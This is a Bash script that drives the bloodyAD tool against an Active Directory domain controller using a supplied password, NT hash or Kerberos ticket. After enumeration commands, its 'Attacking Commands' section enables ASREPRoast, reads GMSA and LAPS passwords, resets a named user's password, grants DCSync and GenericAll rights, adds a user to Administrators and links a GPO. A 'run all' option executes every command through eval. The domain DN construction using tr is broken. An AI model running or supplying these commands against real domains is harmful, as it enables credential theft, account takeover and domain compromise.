#!/bin/bash

# ANSI color codes
BLUE='\033[0;34m'
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m' # No Color

# Function to check if bloodyAD is installed
check_bloodyad() {
    if command -v bloodyAD >/dev/null 2>&1; then
        echo -e "${GREEN}bloodyAD is installed.${NC}"
        return 0
    else
        echo -e "${RED}bloodyAD is not installed.${NC}"
        return 1
    fi
}

# Function to install bloodyAD in a virtual environment
install_bloodyad() {
    echo -e "${GREEN}Creating virtual environment...${NC}"
    python3 -m venv bloodyad_env
    source bloodyad_env/bin/activate
    echo -e "${GREEN}Installing bloodyAD...${NC}"
    pip install bloodyAD
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}bloodyAD installed successfully in virtual environment.${NC}"
    else
        echo -e "${RED}Failed to install bloodyAD. Exiting.${NC}"
        exit 1
    fi
}

# Function to prompt for installation
prompt_install() {
    read -p "Do you want to install bloodyAD? (y/n): " choice
    if [[ "$choice" =~ ^[Yy]$ ]]; then
        install_bloodyad
    else
        echo -e "${RED}Installation aborted. Exiting.${NC}"
        exit 1
    fi
}

# Function to select authentication method
select_auth_method() {
    echo -e "${GREEN}Select authentication method:${NC}"
    echo "1) Password"
    echo "2) Hash"
    echo "3) Ticket"
    read -p "Enter choice (1-3): " auth_choice
    case $auth_choice in
        1) auth_method="Password";;
        2) auth_method="Hash";;
        3) auth_method="Ticket";;
        *) echo -e "${RED}Invalid choice. Exiting.${NC}"; exit 1;;
    esac
}

# Function to collect user input for command parameters
collect_input() {
    read -p "Enter username (e.g., john.doe): " username
    read -p "Enter domain (e.g., bloody): " domain
    read -p "Enter host (e.g., 192.168.10.2): " host
    if [ "$auth_method" = "Password" ]; then
        read -p "Enter password (e.g., Password512!): " password
    elif [ "$auth_method" = "Hash" ]; then
        read -p "Enter NT hash (e.g., 0109d7e72fcfe404186c4079ba6cf79c): " nthash
    fi
}

# Function to escape special characters for safe command execution
escape_special_chars() {
    local input="$1"
    printf '%s' "$input" | sed "s/'/'\\\\''/g"
}

# Function to generate and store commands for the selected authentication method
generate_commands() {
    local method="$1"
    local escaped_username=$(escape_special_chars "$username")
    local escaped_domain=$(escape_special_chars "$domain")
    local escaped_host=$(escape_special_chars "$host")
    local escaped_password=$(escape_special_chars "${password:-}")
    local escaped_nthash=$(escape_special_chars "${nthash:-}")
    local domain_dn="DC=$(echo "$domain" | tr '.' ',DC=')"
    local target_user="JAVIER.MMARSHALL"
    local escaped_target_user=$(escape_special_chars "$target_user")
    local new_password="@@13456QWEasdzxc"
    local escaped_new_password=$(escape_special_chars "$new_password")

    # Clear command array
    commands=()

    echo -e "\n${GREEN}=== $method Authentication Commands ===${NC}"
    echo -e "${BLUE}=== Enumeration Commands ===${NC}"

    # Base command for the authentication method
    local base_cmd
    if [ "$method" = "Password" ]; then
        base_cmd="bloodyAD -u '$escaped_username' -d '$escaped_domain' -p '$escaped_password' --host '$escaped_host'"
    elif [ "$method" = "Hash" ]; then
        base_cmd="bloodyAD -u '$escaped_username' -d '$escaped_domain' -p :'$escaped_nthash' --host '$escaped_host'"
    else  # Ticket
        base_cmd="bloodyAD --kerberos -u '$escaped_username' -d '$escaped_domain' --host '$escaped_host'"
    fi

    # Enumeration commands
    commands+=("$base_cmd get object Users --attr member")
    echo -e "${BLUE}1. Get group members:${NC}"
    echo "${commands[0]}"

    commands+=("$base_cmd get object '$domain_dn' --attr minPwdLength")
    echo -e "${BLUE}2. Get minimum password length policy:${NC}"
    echo "${commands[1]}"

    commands+=("$base_cmd get object '$domain_dn' --attr msDS-Behavior-Version")
    echo -e "${BLUE}3. Get AD functional level:${NC}"
    echo "${commands[2]}"

    commands+=("$base_cmd get children '$domain_dn' --type user")
    echo -e "${BLUE}4. Get all users of the domain:${NC}"
    echo "${commands[3]}"

    commands+=("$base_cmd get children '$domain_dn' --type computer")
    echo -e "${BLUE}5. Get all computers of the domain:${NC}"
    echo "${commands[4]}"

    commands+=("$base_cmd get children '$domain_dn' --type container")
    echo -e "${BLUE}6. Get all containers of the domain:${NC}"
    echo "${commands[5]}"

    commands+=("$base_cmd get object '$escaped_username' --attr userAccountControl")
    echo -e "${BLUE}7. Get UserAccountControl flags:${NC}"
    echo "${commands[6]}"

    commands+=("$base_cmd get dnsDump")
    echo -e "${BLUE}8. Get AD DNS records:${NC}"
    echo "${commands[7]}"

    commands+=("$base_cmd get object '$escaped_username'")
    echo -e "${BLUE}9. Get user object:${NC}"
    echo "${commands[8]}"

    commands+=("$base_cmd get object 'Domain Admins'")
    echo -e "${BLUE}10. Get member of group (Domain Admins):${NC}"
    echo "${commands[9]}"

    commands+=("$base_cmd get writable --detail")
    echo -e "${BLUE}11. Get writable attributes:${NC}"
    echo "${commands[10]}"

    echo -e "\n${RED}=== Attacking Commands ===${NC}"
    commands+=("$base_cmd add uac '$escaped_username' DONT_REQ_PREAUTH")
    echo -e "${RED}12. Enable DONT_REQ_PREAUTH for ASREPRoast:${NC}"
    echo "${commands[11]}"

    commands+=("$base_cmd remove uac '$escaped_target_user' ACCOUNTDISABLE")
    echo -e "${RED}13. Enable a disabled account:${NC}"
    echo "${commands[12]}"

    commands+=("$base_cmd remove uac '$escaped_target_user' LOCKOUT")
    echo -e "${RED}14. Remove account lockout:${NC}"
    echo "${commands[13]}"

    commands+=("$base_cmd get object 'gmsaAccount$' --attr msDS-ManagedPassword")
    echo -e "${RED}15. Read GMSA account password:${NC}"
    echo "${commands[14]}"

    commands+=("$base_cmd get object 'COMPUTER$' --attr ms-Mcs-AdmPwd")
    echo -e "${RED}16. Read LAPS password:${NC}"
    echo "${commands[15]}"

    commands+=("$base_cmd get object '$domain_dn' --attr ms-DS-MachineAccountQuota")
    echo -e "${RED}17. Read quota for adding computer objects to domain:${NC}"
    echo "${commands[16]}"

    commands+=("$base_cmd add dnsRecord my_machine_name 192.168.10.48")
    echo -e "${RED}18. Add a new DNS entry:${NC}"
    echo "${commands[17]}"

    commands+=("$base_cmd remove dnsRecord my_machine_name 192.168.10.48")
    echo -e "${RED}19. Remove a DNS entry:${NC}"
    echo "${commands[18]}"

    commands+=("$base_cmd set password '$escaped_target_user' '$escaped_new_password'")
    echo -e "${RED}20. Set password for user:${NC}"
    echo "${commands[19]}"

    commands+=("$base_cmd add dcsync '$escaped_username'")
    echo -e "${RED}21. Add dcsync to object:${NC}"
    echo "${commands[20]}"

    commands+=("$base_cmd add genericAll MS01$ '$escaped_username'")
    echo -e "${RED}22. Add GenericAll to object:${NC}"
    echo "${commands[21]}"

    commands+=("$base_cmd add groupMember 'Administrators' test")
    echo -e "${RED}23. Add user to group (Administrators):${NC}"
    echo "${commands[22]}"

    commands+=("$base_cmd set object SRV01$ GPLink -v CN={2AADC2C9-C75F-45EF-A002-A22E1893FDB5},CN=POLICIES,CN=SYSTEM,'$domain_dn'")
    echo -e "${RED}24. Linking GPO:${NC}"
    echo "${commands[23]}"
}

# Function to execute selected command(s)
execute_commands() {
    echo -e "\n${GREEN}Do you want to run any commands?${NC}"
    echo "1) Run a specific command (enter number 1-24)"
    echo "2) Run all commands"
    echo "3) Do nothing"
    read -p "Enter choice (1-3): " run_choice

    case $run_choice in
        1)
            read -p "Enter command number (1-24): " cmd_number
            if [[ "$cmd_number" =~ ^[0-9]+$ && "$cmd_number" -ge 1 && "$cmd_number" -le 24 ]]; then
                cmd_index=$((cmd_number - 1))
                echo -e "${GREEN}Executing: ${commands[$cmd_index]}${NC}"
                eval "${commands[$cmd_index]}"
                if [ $? -eq 0 ]; then
                    echo -e "${GREEN}Command executed successfully.${NC}"
                else
                    echo -e "${RED}Command failed.${NC}"
                fi
            else
                echo -e "${RED}Invalid command number. Exiting.${NC}"
                exit 1
            fi
            ;;
        2)
            echo -e "${GREEN}Executing all commands...${NC}"
            for cmd in "${commands[@]}"; do
                echo -e "${GREEN}Running: $cmd${NC}"
                eval "$cmd"
                if [ $? -eq 0 ]; then
                    echo -e "${GREEN}Command executed successfully.${NC}"
                else
                    echo -e "${RED}Command failed.${NC}"
                fi
                sleep 1  # Small delay to prevent overwhelming the system
            done
            ;;
        3)
            echo -e "${GREEN}No commands executed. Exiting.${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}Invalid choice. Exiting.${NC}"
            exit 1
            ;;
    esac
}

# Main script
echo -e "${GREEN}Checking for bloodyAD installation...${NC}"
if ! check_bloodyad; then
    prompt_install
fi

# Activate virtual environment if it exists
if [ -d "bloodyad_env" ]; then
    source bloodyad_env/bin/activate
fi

# Select authentication method and collect input
select_auth_method
collect_input

# Generate and display commands for the selected method
declare -a commands  # Array to store commands for execution
generate_commands "$auth_method"

# Prompt to execute commands
execute_commands